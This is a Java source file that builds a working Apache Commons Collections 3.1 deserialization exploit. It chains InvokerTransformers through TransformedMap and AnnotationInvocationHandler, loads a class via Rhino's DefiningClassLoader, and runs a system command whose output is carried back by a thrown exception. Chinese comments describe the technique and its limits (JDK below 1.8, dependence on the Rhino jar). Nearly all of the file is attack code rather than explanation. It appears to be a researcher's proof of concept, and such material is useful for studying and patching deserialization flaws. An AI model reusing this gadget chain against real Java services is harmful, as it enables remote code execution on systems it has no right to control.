package com.xyh.collections3.no2;

import com.xyh.collections3.SerializeUtil;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import org.mozilla.javascript.DefiningClassLoader;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

/**
 * 此处基于Collections3.1中的TransformedMap利用漏洞，并进一步利用defineCLass构造回显,回显利用异常抛出带回，
 * 但由于DefiningClassLoader类所属jar包使用范围有限，而且AnnotationInvocationHandler的利用也仅限jdk1.8以下，
 * 使得这样的利用链可用性不高。
 *
 * Created by xuanyonghao on 2018/5/4.
 */
public class SerializeMapForTransformer {
    public static void main(String[] args) throws Throwable {
//        testCallbackRuntime();

        testAnnotationInvocationHandlerForDefineClass();
    }

    private static void testAnnotationInvocationHandlerForDefineClass() throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(DefiningClassLoader.class),
                new InvokerTransformer("getConstructor",new Class[]{Class[].class},new Object[]{new Class[0]}),
                new InvokerTransformer("newInstance",new Class[]{Object[].class},new Object[]{new Object[0]}),
                new InvokerTransformer("defineClass",new Class[]{String.class,byte[].class},new Object[]{"com.xyh.collections3.no2.CallbackRuntime",readCallbackRuntimeClassBytes()}),
                new InvokerTransformer("newInstance",new Class[]{},new Object[]{}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"ipconfig"})
        };
        Transformer transformer = new ChainedTransformer(transformers);
        Map inner = new HashMap();
        inner.put("value","value");
        Map ouputMap = TransformedMap.decorate(inner,null,transformer);
        Constructor<?> ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
        ctor.setAccessible(true);
        Object o = ctor.newInstance(Target.class,ouputMap);
        //序列化输出
        byte[] bytes = SerializeUtil.serialize(o);
        //反序列化
        SerializeUtil.deserialize(bytes);
    }

    private static byte[] readCallbackRuntimeClassBytes() throws IOException {
        //执行前先编译CallbackRuntime类得到class文件
        FileInputStream fileInputStream = new FileInputStream(new File("target/classes/com/xyh/collections3/no2/CallbackRuntime.class"));
        byte[] bytes = new byte[fileInputStream.available()];
        fileInputStream.read(bytes);
        return bytes;
    }

    private static void testCallbackRuntime() throws Throwable {
        new CallbackRuntime().exec("ipconfig");
    }

}
